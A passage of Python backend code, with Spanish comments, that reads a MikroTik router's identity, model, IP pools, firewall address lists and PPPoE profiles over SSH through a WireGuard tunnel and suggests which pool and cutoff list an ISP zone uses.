    escribir mal.

    No adivina nada que no este claro: devuelve lo que hay y deja que se
    elija. El unico caso en que propone es cuando hay una sola opcion, o
    cuando los perfiles PPPoE del propio router ya apuntan a un pool.
    """
    zona = db.query(models.Zona).filter(models.Zona.id == zona_id).first()
    if not zona:
        raise HTTPException(status_code=404, detail="Zona no encontrada")
    if not zona.ip_wireguard:
        raise HTTPException(
            status_code=400,
            detail="Esta zona todavia no tiene tunel: sin el no hay camino hasta el router.",
        )

    # Todo en una sola conexion SSH: abrirla es lo que cuesta, no los
    # comandos. Las secciones se separan con marcas para parsearlas aparte.
    cmd = (
        ':put "###IDENTIDAD"; :put [/system identity get name];'
        ' :put "###MODELO"; :put [/system resource get board-name];'
        ' :put "###VERSION"; :put [/system resource get version];'
        ' :put "###POOLS"; :foreach i in=[/ip pool find] do={:put [/ip pool get $i name]};'
        ' :put "###LISTAS"; :foreach i in=[/ip firewall address-list find]'
        ' do={:put [/ip firewall address-list get $i list]};'
        ' :put "###DIRECCIONES"; /ip address print terse;'
        ' :put "###PERFILES"; /ppp profile print terse'
    )
    r = _ssh_exec(zona.ip_wireguard, cmd, timeout=25)
    if not r["ok"]:
        raise HTTPException(
            status_code=502,
            detail=f"No se pudo leer el router: {r['output']}",
        )

    sec = _mk_secciones(r["output"])
    if "IDENTIDAD" not in sec:
        # Si no llego ni la primera marca, lo que contesto no es un RouterOS
        # que entienda estos comandos: mejor decirlo que inventar campos.
        raise HTTPException(
            status_code=502,
            detail="El router contesto algo que no se pudo entender. Revisa el usuario de SSH.",
        )

    def primero(nombre: str) -> Optional[str]:
        vals = sec.get(nombre) or []
        return vals[0] if vals else None

    # Las listas del firewall se repiten (una entrada por IP); interesan los
    # nombres distintos.
    listas = sorted({l for l in sec.get("LISTAS", []) if l})
    pools = sorted({p for p in sec.get("POOLS", []) if p})

    direcciones = []
    for linea in sec.get("DIRECCIONES", []):
        dir_ip = _mk_valor(linea, "address")
        if not dir_ip:
            continue
        direcciones.append({"address": dir_ip, "interface": _mk_valor(linea, "interface")})

    # El pool que de verdad usan los perfiles PPPoE del router: es mejor pista
    # que el nombre de un pool suelto, porque es el que esta dando servicio.
    usados = Counter()
    perfiles = []
    for linea in sec.get("PERFILES", []):
        nombre = _mk_valor(linea, "name")
        remoto = _mk_valor(linea, "remote-address")
        if nombre:
            perfiles.append({"nombre": nombre, "pool": remoto})
        if remoto and remoto in pools:
            usados[remoto] += 1

    pool_sugerido = None
    if usados:
        pool_sugerido = usados.most_common(1)[0][0]
    elif len(pools) == 1:
        pool_sugerido = pools[0]

    # Para el corte, la lista que lleve "corte" en el nombre; si hay una sola
    # lista en el router, esa.
    candidatas = [l for l in listas if "corte" in l.lower()]
    lista_sugerida = candidatas[0] if len(candidatas) == 1 else (
        listas[0] if len(listas) == 1 else None
    )

    modelo = primero("MODELO")
    identidad = primero("IDENTIDAD")
    return {
        "identidad": identidad,
        "modelo": modelo,
        "version": primero("VERSION"),
        # Como se guarda en el campo "Modelo / nombre del router" de la zona.
        "router_mikrotik": " \u2014 ".join([x for x in (modelo, identidad) if x]) or None,
        "pools": pools,
        "pool_sugerido": pool_sugerido,
        "listas": listas,
        "lista_sugerida": lista_sugerida,
        "direcciones": direcciones,
        "perfiles": perfiles,
    }
